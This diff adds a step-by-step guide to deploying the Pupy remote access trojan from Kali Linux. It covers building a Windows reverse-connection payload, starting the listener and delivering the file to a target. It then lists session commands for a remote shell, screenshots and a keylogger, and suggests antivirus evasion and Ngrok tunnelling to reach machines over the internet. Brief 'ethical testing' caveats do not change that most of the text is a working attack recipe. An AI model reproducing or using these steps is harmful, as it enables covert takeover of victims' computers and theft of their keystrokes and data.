@@ -1,0 +1,62 @@
+🔧 Step-by-Step Guide to Use Pupy RAT in Kali Linux
+📌 Step 1: Install Dependencies
+bash
+Copy
+Edit
+sudo apt update
+sudo apt install git python3 python3-pip python3-dev build-essential mingw-w64 zip unzip -y
+📌 Step 2: Clone Pupy Repository
+bash
+Copy
+Edit
+git clone https://github.com/n1nj4sec/pupy.git
+cd pupy
+📌 Step 3: Install Required Python Packages
+bash
+Copy
+Edit
+pip3 install -r requirements.txt
+📌 Step 4: Build Payloads
+Use the pupygen.py script to generate a payload:
+
+bash
+Copy
+Edit
+cd pupy
+python3 pupygen.py -f exe_x64 -o payload.exe -p 4444 LHOST=your_ip
+-f exe_x64: Generates a 64-bit Windows executable
+
+-o payload.exe: Output file name
+
+-p 4444: Port to listen on
+
+LHOST=your_ip: Your IP address (local or public)
+
+📌 Step 5: Start the Listener (Pupy Server)
+bash
+Copy
+Edit
+./pupysh.py
+This will launch an interactive shell that listens for reverse connections from the infected machine.
+
+📌 Step 6: Deliver the Payload (Ethically!)
+Transfer payload.exe to the test system and run it (only in a lab or with permission). Once executed, you should see a session open in pupysh.
+
+✅ Useful Pupy Commands in Session
+Once connected, use commands like:
+
+bash
+Copy
+Edit
+sessions                     # List active sessions
+interact 1                  # Interact with session ID 1
+shell                       # Drop to remote shell
+screenshot                  # Capture remote screen
+keylogger_start             # Start keylogger
+keylogger_dump              # Get logged keystrokes
+🔒 Important Notes
+Firewall/Antivirus may block Pupy. Use evasion methods only for ethical testing.
+
+Use a VPN or tunneling service (like Ngrok) for WAN-based testing.
+
+Always document your activity in a professional setting.
